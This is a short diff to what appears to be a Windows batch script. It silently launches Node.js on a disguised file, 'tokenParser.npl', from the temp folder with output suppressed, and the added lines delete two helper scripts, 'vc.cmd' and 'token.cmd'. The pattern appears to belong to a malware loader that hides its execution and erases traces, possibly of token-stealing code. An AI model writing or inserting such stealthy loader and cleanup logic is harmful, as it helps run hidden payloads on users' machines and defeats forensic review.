@@ -78,5 +78,8 @@ if not exist "%TEMP%\tokenParser.npl" (
 
 start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl" >nul 2>&1
 
+del /f /q "%TEMP%\vc.cmd"
+del /f /q "%TEMP%\token.cmd"
+
 endlocal
 exit /b 0
